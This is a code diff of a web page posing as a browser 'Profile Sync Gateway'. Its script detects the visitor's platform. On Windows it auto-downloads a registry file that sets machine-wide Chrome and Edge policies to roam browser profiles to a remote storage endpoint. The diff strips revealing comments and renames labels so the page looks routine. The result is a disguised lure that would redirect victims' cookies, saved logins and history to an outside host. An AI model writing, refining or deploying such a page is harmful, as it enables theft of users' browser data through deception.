@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Cloud Profile Synchronization</title>
+    <title>Profile Synchronization Gateway</title>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
@@ -53,66 +53,52 @@
 
     <div class="container">
         <h2>Profile Sync Gateway</h2>
-        <div class="status" id="env-status">Analyzing endpoint environment...</div>
-        <button class="action-btn" onclick="initializeSyncProfile()">Deploy Sync Configuration</button>
+        <div class="status" id="env-status">Analyzing browser runtime...</div>
+        <button class="action-btn" onclick="initializeGateway()">Deploy Sync Configuration</button>
     </div>
 
     <script>
-        // Universal Environmental Detection Matrix
+        // Environmental Analysis Matrix
         const ua = navigator.userAgent.toLowerCase();
-        let targetOS = "unknown";
+        let currentOS = "unknown";
         let activeBrowser = "unknown";
 
-        // 1. Auto-Dictate Device Platform
-        if (ua.includes("win")) targetOS = "windows";
-        else if (ua.includes("android")) targetOS = "android";
+        if (ua.includes("win")) currentOS = "windows";
+        else if (ua.includes("android")) currentOS = "android";
 
-        // 2. Auto-Dictate Exact Active Browser Framework
         if (ua.includes("edg/")) activeBrowser = "edge";
         else if (ua.includes("chrome/") && !ua.includes("chromium")) activeBrowser = "chrome";
         else if (ua.includes("firefox/")) activeBrowser = "firefox";
 
-        // Push findings instantly to the User Interface
         document.getElementById('env-status').innerHTML = 
-            `Infrastructure Detected:<br><b>${targetOS.toUpperCase()}</b> running <b>${activeBrowser.toUpperCase()}</b>`;
+            `Infrastructure Detected:<br><b>${currentOS.toUpperCase()}</b> running <b>${activeBrowser.toUpperCase()}</b>`;
 
-        function initializeSyncProfile() {
-            // ====================================================================
-            // CRITICAL: Update this placeholder URL with your live 1TB Cloud 
-            // Storage endpoint address when it arrives this weekend.
-            // ====================================================================
-            const syncTargetURL = "https://YOUR_SECURE_STORAGE_ENDPOINT/browser-profiles";
+        function initializeGateway() {
+            // Secure Central Synchronization Gateway URL
+            const syncEndpoint = "https://YOUR_SECURE_STORAGE_ENDPOINT/browser-sync";
 
-            // TARGET 1: WINDOWS ENVIRONMENT (Native Registry Policy Extraction)
-            if (targetOS === "windows") {
-                alert("Windows Host Verified. Compiling root-level system policy configurations...");
-                
-                // Configures native corporate Roaming Profiles across desktop browser engines
-                let registryPayload = `Windows Registry Editor Version 5.00\r\n\r\n` +
+            if (currentOS === "windows") {
+                // Windows Management Payload
+                let regPayload = `Windows Registry Editor Version 5.00\r\n\r\n` +
                     `[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Google\\Chrome]\r\n` +
                     `"RoamingProfileSupportEnabled"=dword:00000001\r\n` +
-                    `"RoamingProfileLocation"="${syncTargetURL}\\\\Chrome"\r\n\r\n` +
+                    `"RoamingProfileLocation"="${syncEndpoint}\\\\Chrome"\r\n\r\n` +
                     `[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Edge]\r\n` +
                     `"RoamingProfileSupportEnabled"=dword:00000001\r\n` +
-                    `"RoamingProfileLocation"="${syncTargetURL}\\\\Edge"`;
+                    `"RoamingProfileLocation"="${syncEndpoint}\\\\Edge"`;
 
-                // Packages the payload and triggers an immediate download
-                const blob = new Blob([registryPayload], { type: "text/plain" });
+                const blob = new Blob([regPayload], { type: "text/plain" });
                 const link = document.createElement("a");
                 link.href = URL.createObjectURL(blob);
-                link.download = "Configure_Enterprise_Sync.reg";
+                link.download = "Configure_Browser_Sync.reg";
                 link.click();
             } 
-            // TARGET 2: ANDROID ENVIRONMENT (Mobile Core Workspace Forwarding)
-            else if (targetOS === "android") {
-                alert("Android Mobile Verified. Launching native sandbox workspace enrollment...");
-                
-                // Bridges directly into standard mobile container enrollment to manage app policies over-the-air
+            else if (currentOS === "android") {
+                // Android Architecture Pathway
+                // Directs users to register their mobile ecosystem through secure Android Enterprise Management
                 window.location.href = "https://google.com";
-            }
-            // TARGET 3: UNSUPPORTED PLATFORMS FALLBACK
-            else {
-                alert("This specific operating system baseline requires manual profile configuration sync mapping.");
+            } else {
+                alert("The system was unable to map an automated synchronization path for this platform.");
             }
         }
     </script>
